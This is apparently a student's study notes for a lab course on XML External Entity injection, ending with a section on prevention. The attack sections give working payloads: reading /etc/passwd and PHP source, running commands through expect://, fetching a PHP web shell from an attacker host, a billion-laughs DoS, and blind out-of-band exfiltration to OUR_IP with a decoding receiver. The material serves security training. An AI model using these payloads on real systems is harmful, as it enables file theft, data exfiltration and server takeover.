## 1-Intro to XXE
`XML External Entity (XXE) Injection` happens when a web application parses user-supplied XML **without proper sanitization**, allowing attackers to use XML features to perform malicious actions. XXE can lead to:

- Reading sensitive server files
- SSRF (Server-Side Request Forgery)
- Denial-of-service
- System compromise
This is why XXE is listed in the **OWASP Top 10**.


#### XML 
XML (`Extensible Markup Language`) is used to structure and store data. It is made of:

- **Tags** – e.g., `<date>`
- **Elements** – start/end tag + value: `<date>01-01-2022</date>`
- **Entities** – variables like `&email;`
- **Attributes** – additional info inside tags: `version="1.0"`/`encoding="UTF-8"`
- **Declarations** – e.g., version info at the top: `<?xml version="1.0" encoding="UTF-8"?>`

Example XML document:
```xml
<!-- email.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<email>
  <date>01-01-2022</date>
  <time>10:00 am UTC</time>
  <sender>john@inlanefreight.com</sender>
  <recipients>
    <to>HR@inlanefreight.com</to>
    <cc>
        <to>billing@inlanefreight.com</to>
        <to>payslips@inlanefreight.com</to>
    </cc>
  </recipients>
  <body>
  Hello,
      Kindly share with me the invoice for the payment made on January 1, 2022.
  Regards,
  John
  </body> 
</email>
```
Special characters like `<`, `>`, `&`, `"` must be escaped using XML entities.
#### XML DTD 
A DTD  **(Document Type Definition)** defines the **structure** of an XML document. It can be included internally or loaded externally.

Example internal DTD:
```xml
<!-- email.dtd -->
<!DOCTYPE email [
  <!ELEMENT email (date, time, sender, recipients, body)>
  <!ELEMENT recipients (to, cc?)>
  <!ELEMENT cc (to*)>
  <!ELEMENT date (#PCDATA)>
  <!ELEMENT time (#PCDATA)>
  <!ELEMENT sender (#PCDATA)>
  <!ELEMENT to  (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```
The above DTD can be placed within the XML document itself, right after the `XML Declaration` in the first line. Otherwise, it can be stored in an external file (e.g. `email.dtd`), and then referenced within the XML document with the `SYSTEM` keyword, as follows:

**internal**: Referencing an external DTD file:
```xml
<!-- email.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "email.dtd">
```

**external**: It is also possible to reference a DTD through a URL, as follows:
```xml
<!-- email.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">
```


#### XML Entities
Entities act like variables. define custom entities (i.e. XML variables) **in XML DTDs** 
This can be done with the use of the `ENTITY` keyword, which is followed by the entity name and its value, as follows:

```xml
<!-- email.dtd -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```


**internal:** it can be referenced in an XML document between an ampersand `&` and a semi-colon `;` (e.g. `&company;`). Whenever an entity is referenced, it will be replaced with its value by the XML parser
```xml
<!-- email.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY &company;
]>
```


Or **external** with the `SYSTEM` keyword or `PUBLIC` , which is followed by the external entity's path, as follows:
```xml
<!-- email.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "http://localhost/company.txt">
  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
]>
```

When parsed, `&signature;` will be replaced with the contents of `signature.txt`.  
If parsing happens on the **server**, this allows attackers to load **local files on the server**, leading to XXE exploitation.


---
## 2- Local File Disclosure
When a web application accepts **unfiltered XML**, we can define **external entities** that reference **local files** on the server.  
If the application displays the entity value in the response, we can read sensitive backend files.
#### Identifying XXE
We look for pages that accept **XML user input**.  
Example: A contact form that sends XML to the backend.
![[Pasted image 20251125124910.png]]
If the `<email></email>` element is reflected, we can inject into it.

To test entity injection, add a DTD and define an internal entity:
```xml
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

Then use it:`<email>&company;</email>`
If the value appears in the response, **the application is vulnerable to XXE**.
![[Pasted image 20251125124955.png]]
 the response did use the value of the entity we defined (`Inlane Freight`) instead of displaying `&company;`,==This confirms that we are dealing with a web application vulnerable to XXE==
>**Note:** Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
#### Reading Sensitive Files
To load local files, define an **external entity** pointing to a file path:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```
Using `&company;` will disclose `/etc/passwd` if the app is vulnerable.
![[Pasted image 20251125125107.png]]
This allows reading:
- System files  
- Config files with credentials  
- SSH private keys (`id_rsa`)  
>Some Java apps even allow directory listings.
#### Reading Source Code
Directly referencing source files often fails because PHP files contain XML-breaking characters (`< > &`).

Example that **fails**:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file://index.php">
]>
```

To bypass this, PHP offers `php://filter`:
```xml
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```
![[Pasted image 20251125125229.png]]
This returns **base64**, which can be decoded to reveal the PHP source.

> This trick only works only  on **PHP** applications.The next section will discuss a more advanced method for reading source code, which should work with any web framework.
#### Remote Code Execution with XXE
XXE can sometimes be escalated to **RCE**, commonly by:
- Stealing SSH keys  
- Triggering Windows hash leaks  
- Using PHP filters (if enabled): `expect://`

Example using PHP `expect` filter to run a command:
```xml
<!ENTITY company SYSTEM "expect://id">
```
If output is reflected, commands execute successfully.

**Using XXE to Upload a Web Shell:**

Create a simple web shell:
```bash
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

Then use XXE + `curl` to fetch it on the server:
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

Spaces are replaced with `$IFS` to avoid XML breaking.

> The PHP `expect` module is rarely enabled, so this attack won't always work.

#### Other XXE Attacks
**SSRF:** XXE can act as SSRF by referencing internal URLs with external entities.

 **Denial of Service:**
 This payload defines the `a0` entity as `DOS`, references it in `a1` multiple times, references `a1` in `a2`, and so on until the back-end server's memory runs out due to the self-reference loops. However, `this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference`. T
```xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6%;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7%;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8%;">
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9%;">
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```


---

## 3- Advanced File Disclosure
Not every XXE vulnerability is easy to exploit.  
Sometimes the app strips output, breaks XML on special characters, or **refuses to display entity contents.**  
This section covers **advanced exfiltration** techniques that bypass these issues.

#### Advanced Exfiltration with CDATA
When file contents contain **special characters** that break XML, we can wrap them inside a **CDATA** block:`<![CDATA[ RAW_DATA_HERE ]]>`

To automate this, we try joining:
- `begin` → `<![CDATA[`  
- `file` → external file contents  
- `end` → `]]>`  

Example attempt:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
`<!ENTITY joined "&begin;&file;&end;">` ==**fails** because XML forbids joining internal + external entities.==

to fix it **Using Parameter Entities (Working Bypass)**
Parameter entities (`%`) **can** be joined, if loaded from an external DTD.

External DTD (`xxe.dtd`):
```xml
<!ENTITY joined "%begin;%file;%end;">
```

Host this DTD:
```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
python3 -m http.server 8000
```

Then trigger from XML:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
<email>&joined;</email>
```

This produces the **raw** file content, without needing Base64.
>**Note:** In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.

#### Error-Based XXE
When the application:
- does **not reflect any XML output**,  
- but **does show server errors**,  
…we can leak file contents **inside the error message**.

First, send malformed XML to confirm visible errors.  example:
```xml
&nonExistingEntity;
```
![[Pasted image 20251125133809.png]]
If errors appear, we can exploit them.

now let try  leak file contents **inside the error message**.
 **External DTD for Error-Based LFI:**
 
 we will host a DTD file `xxe.dtd` that contains the following payload:
```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

```bash
python -m http.server # xxe.dtd host 
```
The above payload defines the `file` parameter entity and then joins it with an entity that does not exist.

What happens:
- `%nonExistingEntity;` does not exist → error  
- the concatenated path includes `%file;`  
- server error message leaks the file contents  

Now, we can call our external DTD script, and then reference the `error` entity, as follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.24:8000/xxe.dtd">
  %remote;
  %error;
]>
```
![[Pasted image 20251125134044.png]]
This prints `/etc/hosts` inside the PHP error output.

You can replace the file with any path, for example:
```bash
file:///var/www/html/submitDetails.php
```

**Limitations:**
- Some chara/cters may break the XML error  
- Some servers truncate long error messages  
- Less reliable than CDATA parameter-entity exfiltration


---

## 4- Blind Data Exfiltration
In this scenario, the web application gives **no output at all**:
- No reflected XML entities  
- No server errors  
- No debugging information  

This makes XXE fully **blind**, so we must exfiltrate data using **out-of-band (OOB)** communication.

#### Out-of-Band Data Exfiltration (OOB)
At `/blind`, none of the previous methods work because nothing is printed back.  
Instead, we make the vulnerable server **send the file contents to us** over HTTP.

 **Idea:**
1. Use a parameter entity to read the file and **Base64-encode** it.
2. Make the XML parser load an external entity that points to our server.
3. Embed the encoded file content inside the **URL query**.
4. Capture the request → decode → get file content.

write our dtd on local machine  for `xxe.dtd`:
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

 **Creat Auto-decoding receiver server script:**
Create `index.php`:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```
Start the PHP server:
```shell
php -S 0.0.0.0:8000
```

**Trigger payload**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
![[Pasted image 20251125151444.png]]
After sending the request, your terminal will show decoded file contents:
The vulnerable app will request:
```BASH
http://OUR_IP:8000/?content=cm9vdD...
 # root:x:0:0:root:/root:/bin/bash
 # daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

> You can also exfiltrate via **DNS** (e.g., `BASE64DATA.attacker.com`) and capture queries using `tcpdump`.

---

#### Automated OOB Exfiltration 
The tool **XXEinjector** automates almost all XXE techniques, including blind OOB.

Clone the repo:
```shell
git clone https://github.com/enjoiz/XXEinjector.git
```

Prepare a request template, And write `XXEINJECT` after it as a position locator for the tool:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
...
<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

Run the tool:

```shell
ruby XXEinjector.rb \
  --host=[tun0 IP] \
  --httpport=8000 \
  --file=/tmp/xxe.req \
  --path=/etc/passwd \
  --oob=http \
  --phpfilter

# ONE LINE
# ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

The exfiltrated data is saved under `Logs/`:
```shell
cat Logs/10.129.201.94/etc/passwd.log
  # root:x:0:0:root:/root:/bin/bash
```
This method allows full file extraction even when the application is **completely blind**.


---
## 5- XXE Prevention
XE vulnerabilities occur when unsafe XML input references external entities. Preventing XXE is **easier than many other web vulnerabilities**, as it mainly depends on keeping XML libraries and parsers safe and up-to-date.
####  Avoid Outdated Components
- XXE is often caused by **outdated XML libraries**, not direct developer mistakes.  
- Example: PHP’s `libxml_disable_entity_loader()` is **deprecated** since PHP 8.0. Using it unsafely can lead to XXE.  
- Always update:
  - XML libraries
  - API parsers (e.g., SOAP)
  - File/document processors (SVG, PDF, etc.)
  - Web components and package managers (e.g., npm modules)

> Using the latest XML libraries and development components **reduces many web vulnerabilities**, including XXE.

Reference: [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)


#### Using Safe XML Configurations
Even with updated libraries, configuring XML safely adds another layer of defense:

- **Disable** custom `Document Type Definitions (DTDs)`
- **Disable** external XML entities
- **Disable** parameter entity processing
- **Disable** `XInclude`
- **Prevent** entity reference loops
- **Proper exception handling**  
- **Do not display runtime errors** to users  

These measures prevent exploitation even if libraries are misconfigured.
####  Consider Alternative Data Formats

- Prefer **JSON or YAML** over XML when possible
- Use **REST APIs** instead of XML-based APIs like SOAP
- Reduces the attack surface for XXE attacks
#### Additional Layer: WAFs

- Web Application Firewalls can help **mitigate XXE attacks**
- **Do not rely solely on WAFs**; always secure the back-end and libraries

---


